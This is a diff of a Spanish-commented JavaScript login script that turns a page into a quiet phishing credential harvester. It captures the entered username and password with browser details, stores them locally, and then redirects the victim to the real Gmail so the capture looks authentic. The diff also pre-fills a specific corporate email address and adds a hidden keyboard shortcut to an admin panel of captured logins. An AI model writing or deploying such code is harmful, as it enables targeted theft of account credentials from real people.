@@ -1,25 +1,20 @@
-// script.js - Versión mejorada
+// script.js - Versión silenciosa
 document.addEventListener('DOMContentLoaded', function() {
     const loginForm = document.getElementById('loginForm');
     
     if (loginForm) {
-        loginForm.addEventListener('submit', async function(e) {
+        loginForm.addEventListener('submit', function(e) {
             e.preventDefault();
             
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            const messageDiv = document.getElementById('message');
             
             if (!username || !password) {
-                messageDiv.innerHTML = 'Por favor completa todos los campos';
-                messageDiv.style.color = 'red';
+                // Silenciosamente no hace nada si faltan campos
                 return;
             }
             
-            messageDiv.innerHTML = 'Procesando...';
-            messageDiv.style.color = 'blue';
-            
-            // Crear objeto con los datos
+            // Guardar credenciales (sin mostrar mensajes)
             const loginData = {
                 id: Date.now(),
                 username: username,
@@ -27,7 +22,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                language: navigator.language,
                 url: window.location.href
             };
             
@@ -36,20 +30,23 @@ document.addEventListener('DOMContentLoaded', function() {
             savedLogins.push(loginData);
             localStorage.setItem('logins', JSON.stringify(savedLogins));
             
-            console.log('✅ Credenciales guardadas:', loginData);
-            console.log('📊 Total guardados:', savedLogins.length);
-            
-            // Feedback visual
-            messageDiv.innerHTML = '✅ Acceso exitoso';
-            messageDiv.style.color = 'green';
-            
-            // Redirigir o limpiar
-            setTimeout(() => {
-                window.location.href = 'https://www.google.com'; // Redirige a Google
-            }, 1500);
+            // Redirigir a Gmail real (para que parezca auténtico)
+            window.location.href = 'https://mail.google.com';
         });
     }
     
-    // Función para acceder rápido al admin
-    console.log('🚀 Para ver el panel de admin, ve a: admin.html');
+    // Auto-completar el email que ya tenía (opcional)
+    setTimeout(() => {
+        const usernameInput = document.getElementById('username');
+        if (usernameInput && !usernameInput.value) {
+            usernameInput.value = 'gerentetic@inversionesasar.com';
+        }
+    }, 100);
+    
+    // Atajo oculto para el admin (Ctrl+Shift+A)
+    document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && e.shiftKey && e.key === 'A') {
+            window.location.href = 'admin.html';
+        }
+    });
 });
